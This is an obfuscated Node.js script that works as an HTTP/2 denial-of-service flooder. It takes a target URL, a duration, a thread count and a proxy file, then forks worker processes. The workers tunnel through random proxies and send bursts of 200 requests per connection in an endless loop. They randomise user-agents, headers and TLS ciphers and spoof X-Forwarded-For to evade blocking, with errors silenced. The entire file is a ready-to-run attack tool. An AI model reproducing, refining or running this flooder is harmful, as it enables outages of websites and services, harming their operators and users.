var _0xfaa2 = ["url", "fs", "http2", "http", "tls", "net", "cluster", "fake-useragent", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5", "deflate, gzip;q=1.0, *;q=0.5", "gzip, deflate, br", "*", "no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError", "SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO", "setMaxListeners", "warning", "code", "includes", "name", "on", "unhandledRejection", "uncaughtException", "random", "length", "floor", "argv", "match", "utf-8", "readFileSync", "isMaster", "Thanks For Using My Script<3", "log", "fork", "exit", "parse", ":", "split", "path", "GET", "host", "Keep-Alive", "CONNECT", ":443", "setSocketKeepAlive", "request", "connect", "href", "TLS_method", "1.2", "1.3", "h2", "utf8", "setEncoding", "data", "response", "close", "end"];
const url = require(_0xfaa2[0]);
const fs = require(_0xfaa2[1]);
const http2 = require(_0xfaa2[2]);
const http = require(_0xfaa2[3]);
const tls = require(_0xfaa2[4]);
const net = require(_0xfaa2[5]);
const cluster = require(_0xfaa2[6]);
const fakeua = require(_0xfaa2[7]);
const cplist = [_0xfaa2[8], _0xfaa2[9], _0xfaa2[10], _0xfaa2[11], _0xfaa2[12], _0xfaa2[13]];
const accept_header = [_0xfaa2[14], _0xfaa2[15], _0xfaa2[16], _0xfaa2[17]];
const lang_header = [_0xfaa2[18], _0xfaa2[19], _0xfaa2[20], _0xfaa2[21], _0xfaa2[22], _0xfaa2[23], _0xfaa2[24]];
const encoding_header = [_0xfaa2[25], _0xfaa2[26], _0xfaa2[27]];
const controle_header = [_0xfaa2[28], _0xfaa2[29], _0xfaa2[30], _0xfaa2[31], _0xfaa2[32]];
const ignoreNames = [_0xfaa2[33], _0xfaa2[34], _0xfaa2[35], _0xfaa2[36], _0xfaa2[37], _0xfaa2[38]];
const ignoreCodes = [_0xfaa2[39], _0xfaa2[40], _0xfaa2[41], _0xfaa2[42], _0xfaa2[43], _0xfaa2[44], _0xfaa2[45], _0xfaa2[46], _0xfaa2[47]];
process[_0xfaa2[53]](_0xfaa2[55], function (_0xb7e5x10) {
  if (_0xb7e5x10[_0xfaa2[50]] && ignoreCodes[_0xfaa2[51]](_0xb7e5x10[_0xfaa2[50]]) || _0xb7e5x10[_0xfaa2[52]] && ignoreNames[_0xfaa2[51]](_0xb7e5x10[_0xfaa2[52]])) {
    return false;
  }
})[_0xfaa2[53]](_0xfaa2[54], function (_0xb7e5x10) {
  if (_0xb7e5x10[_0xfaa2[50]] && ignoreCodes[_0xfaa2[51]](_0xb7e5x10[_0xfaa2[50]]) || _0xb7e5x10[_0xfaa2[52]] && ignoreNames[_0xfaa2[51]](_0xb7e5x10[_0xfaa2[52]])) {
    return false;
  }
})[_0xfaa2[53]](_0xfaa2[49], _0xb7e5x10 => {
  if (_0xb7e5x10[_0xfaa2[50]] && ignoreCodes[_0xfaa2[51]](_0xb7e5x10[_0xfaa2[50]]) || _0xb7e5x10[_0xfaa2[52]] && ignoreNames[_0xfaa2[51]](_0xb7e5x10[_0xfaa2[52]])) {
    return false;
  }
})[_0xfaa2[48]](0);
function accept() {
  return accept_header[Math[_0xfaa2[58]](Math[_0xfaa2[56]]() * accept_header[_0xfaa2[57]])];
}
function lang() {
  return lang_header[Math[_0xfaa2[58]](Math[_0xfaa2[56]]() * lang_header[_0xfaa2[57]])];
}
function encoding() {
  return encoding_header[Math[_0xfaa2[58]](Math[_0xfaa2[56]]() * encoding_header[_0xfaa2[57]])];
}
function controling() {
  return controle_header[Math[_0xfaa2[58]](Math[_0xfaa2[56]]() * controle_header[_0xfaa2[57]])];
}
function cipher() {
  return cplist[Math[_0xfaa2[58]](Math[_0xfaa2[56]]() * cplist[_0xfaa2[57]])];
}
const target = process[_0xfaa2[59]][2];
const time = process[_0xfaa2[59]][3];
const thread = process[_0xfaa2[59]][4];
const proxys = fs[_0xfaa2[62]](process[_0xfaa2[59]][5], _0xfaa2[61]).toString()[_0xfaa2[60]](/\S+/g);
function proxyr() {
  return proxys[Math[_0xfaa2[58]](Math[_0xfaa2[56]]() * proxys[_0xfaa2[57]])];
}
if (cluster[_0xfaa2[63]]) {
  const dateObj = new Date();
  console[_0xfaa2[65]](`➣ FOCKET ATTACKING ⌨ !`);
  for (var bb = 0; bb < thread; bb++) {
    cluster[_0xfaa2[66]]();
  }
  ;
  setTimeout(() => {
    process[_0xfaa2[67]](-1);
  }, time * 1000);
} else {
  function flood() {
    var _0xb7e5x1e = url[_0xfaa2[68]](target);
    const _0xb7e5x1f = fakeua();
    var _0xb7e5x20 = cipher();
    var _0xb7e5x21 = proxyr()[_0xfaa2[70]](_0xfaa2[69]);
    var _0xb7e5x22 = {
      ":path": _0xb7e5x1e[_0xfaa2[71]],
      "X-Forwarded-For": _0xb7e5x21[0],
      "X-Forwarded-Host": _0xb7e5x21[0],
      ":method": _0xfaa2[72],
      "User-agent": _0xb7e5x1f,
      "Origin": target,
      "Accept": accept(),
      "Accept-Encoding": encoding(),
      "Accept-Language": lang(),
      "Cache-Control": controling()
    };
    const _0xb7e5x23 = new http.Agent({
      keepAlive: true,
      keepAliveMsecs: 20000,
      maxSockets: 0
    });
    var _0xb7e5x24 = http[_0xfaa2[78]]({
      host: _0xb7e5x21[0],
      agent: _0xb7e5x23,
      globalAgent: _0xb7e5x23,
      port: _0xb7e5x21[1],
      headers: {
        "Host": _0xb7e5x1e[_0xfaa2[73]],
        "Proxy-Connection": _0xfaa2[74],
        "Connection": _0xfaa2[74]
      },
      method: _0xfaa2[75],
      path: _0xb7e5x1e[_0xfaa2[73]] + _0xfaa2[76]
    }, function () {
      _0xb7e5x24[_0xfaa2[77]](true);
    });
    _0xb7e5x24[_0xfaa2[53]](_0xfaa2[79], function (_0xb7e5x25, _0xb7e5x26, _0xb7e5x27) {
      const _0xb7e5x28 = http2[_0xfaa2[79]](_0xb7e5x1e[_0xfaa2[80]], {
        createConnection: () => {
          return tls[_0xfaa2[79]]({
            host: _0xb7e5x1e[_0xfaa2[73]],
            ciphers: _0xb7e5x20,
            secureProtocol: _0xfaa2[81],
            TLS_MIN_VERSION: _0xfaa2[82],
            TLS_MAX_VERSION: _0xfaa2[83],
            servername: _0xb7e5x1e[_0xfaa2[73]],
            secure: true,
            rejectUnauthorized: false,
            ALPNProtocols: [_0xfaa2[84]],
            socket: _0xb7e5x26
          }, function () {
            for (let _0xb7e5x29 = 0; _0xb7e5x29 < 200; _0xb7e5x29++) {
              const _0xb7e5x24 = _0xb7e5x28[_0xfaa2[78]](_0xb7e5x22);
              _0xb7e5x24[_0xfaa2[86]](_0xfaa2[85]);
              _0xb7e5x24[_0xfaa2[53]](_0xfaa2[87], _0xb7e5x2a => {});
              _0xb7e5x24[_0xfaa2[53]](_0xfaa2[88], () => {
                _0xb7e5x24[_0xfaa2[89]]();
              });
              _0xb7e5x24[_0xfaa2[90]]();
            }
          });
        }
      });
    });
    _0xb7e5x24[_0xfaa2[90]]();
  }
  setInterval(() => {
    flood();
  });
}
